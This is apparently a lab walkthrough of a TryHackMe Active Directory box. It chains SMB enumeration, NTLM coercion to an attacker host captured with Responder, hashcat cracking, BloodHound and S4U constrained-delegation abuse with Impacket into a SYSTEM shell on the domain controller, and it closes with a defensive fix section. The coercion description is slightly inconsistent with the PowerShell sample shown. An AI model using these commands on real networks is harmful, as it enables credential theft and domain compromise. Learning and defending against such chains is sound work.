# Active Directory: File Coercion to Domain Admin — TryHackMe (Proxy)

**Date:** 2026-09-09  
**Category:** Active Directory, Network  
**Skills used:** SMB enumeration, forced authentication (NTLM capture), hash cracking, BloodHound, Kerberos constrained delegation abuse  

> **TL;DR:** Enumerated an SMB share to find a scheduled service that inspects file icons,
> coerced it into authenticating to user to capture an NTLM hash via Responder, cracked the hash
> offline, then used BloodHound to find that the compromised account had `AllowedToDelegate`
> rights — abused via S4U2Self/S4U2Proxy to request a service ticket impersonating the
> Administrator, landing a Domain Admin shell.

## Overview
The full chain, end to end:
**SMB enumeration → identify a coercible service → capture an NTLM hash → crack it → find a
delegation misconfiguration → abuse Kerberos delegation → Domain Admin.** Each stage fed
directly into the next, which is what made this the most involved lab I've done so far.

## Stage 1 — SMB Enumeration
Listed available shares anonymously:

```bash
smbclient -L \\$TARGET_IP -N
```

Inside an `IT-Shared` share I found a README describing a scheduled task:

```
File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.
```

This is the key finding: an automated service, running as `svc.scanner`, that **inspects file
icons** on anything dropped into the share. Anywhere a service renders an icon from a path *you*
control is a potential forced-authentication opportunity — Windows Explorer/shell icon lookups
will reach out over SMB to resolve a UNC path, sending an NTLM authentication attempt in the
process.

## Stage 2 — Forced Authentication (NTLM Capture)
I dropped a file into the share designed to make the scanner's shell enumeration reach out to a
host I controlled. It referenced an icon over a UNC path pointing at my attacker machine:

```powershell
# shell.ps1
Test-Path \\$ATTACKER_IP\icons\icon.ico
```

With **Responder** listening on my machine, the `svc.scanner` service's icon lookup triggered an
NTLM authentication attempt against me — and Responder captured the **NetNTLM hash** for
`svc.scanner`.

## Stage 3 — Cracking the Hash
Cracked the captured hash offline with hashcat and the rockyou.txt wordlist:

```bash
hashcat -m 5600 svc.scanner.hash rockyou.txt
```

This recovered the plaintext password for `svc.scanner` (redacted here, but usable in the next
stage).

## Stage 4 — BloodHound: Finding the Delegation Path
With valid domain credentials for `svc.scanner`, I collected data with BloodHound and used its
pathfinding to look for privilege-escalation routes from that account. It surfaced an
**`AllowedToDelegate`** edge from `svc.scanner` toward a sensitive target — meaning
`svc.scanner` is configured for **constrained delegation**: it's trusted to request service
tickets *on behalf of other users*, including — critically — Domain Admins, for a specific
service (here, `cifs/dc01.ctf.local`).

## Stage 5 — Abusing Constrained Delegation (S4U2Self/S4U2Proxy)
Constrained delegation with protocol transition lets an account request a service ticket
**impersonating any user** for the allowed service, without needing that user's credentials.
Using Impacket's `getST.py`, I requested a ticket impersonating the Administrator:

```bash
getST.py -spn "cifs/dc01.ctf.local" -impersonate Administrator \
  -dc-ip $DC_IP 'ctf.local/svc.scanner:[REDACTED]'
```

This performs the **S4U2Self → S4U2Proxy** exchange: `svc.scanner` requests a ticket to itself
*as* the Administrator (S4U2Self), then uses that to request a service ticket for `cifs/` on
the domain controller *as* the Administrator (S4U2Proxy) — because the DC trusts `svc.scanner`
to delegate for that specific service.

## Stage 6 — Domain Admin Shell
With the forged ticket, I authenticated as Administrator using Impacket's `psexec.py` (Kerberos
auth, no password needed since the ticket carries the identity):

```bash
psexec.py -k -no-pass ctf.local/Administrator@dc01.ctf.local
```

This landed a **SYSTEM shell as Domain Admin** on the domain controller, completing the chain
from an anonymous SMB read to full domain compromise.

## The Fix (Defensive View)
Each stage has a specific defense:
- **Coercion (Stage 2):** disable NTLM where possible in favor of Kerberos-only auth; enforce
  **SMB signing** so a captured hash can't be relayed; block outbound SMB (445) at the network
  edge so icon/UNC lookups can't reach an attacker-controlled host.
- **Hash cracking (Stage 3):** enforce strong password policies for **service accounts**
  specifically — they're often set once and never rotated, and are exactly what NTLM capture
  targets.
- **Delegation (Stages 4–5):** treat `AllowedToDelegate` as a **high-privilege right**, not a
  default. Audit which accounts have constrained delegation configured, and restrict it to the
  minimum required services. Prefer **resource-based constrained delegation**, which is
  configured on the resource rather than the delegating account and is easier to audit and
  scope tightly.
- **General:** this is exactly why BloodHound matters for defenders too — running it against
  your own domain surfaces these paths (like the `AllowedToDelegate` edge here) before an
  attacker does.

## What I Learned
This was a full AD attack chain, and the biggest lesson was how each stage **compounds**:
a low-privilege file share read led to a coercion opportunity, which led to a crackable hash,
which led to a domain account, which BloodHound turned into a mapped privilege-escalation path,
which a specific Kerberos delegation abuse turned into Domain Admin. No single step required
deep AD expertise — the difficulty was in **chaining recon (SMB, BloodHound) with exploitation
(coercion, S4U abuse)** rather than any one exotic technique. Understanding *why*
`AllowedToDelegate` is dangerous — that it lets an account impersonate anyone, including DAs,
for a given service — was the concept that tied the whole chain together.
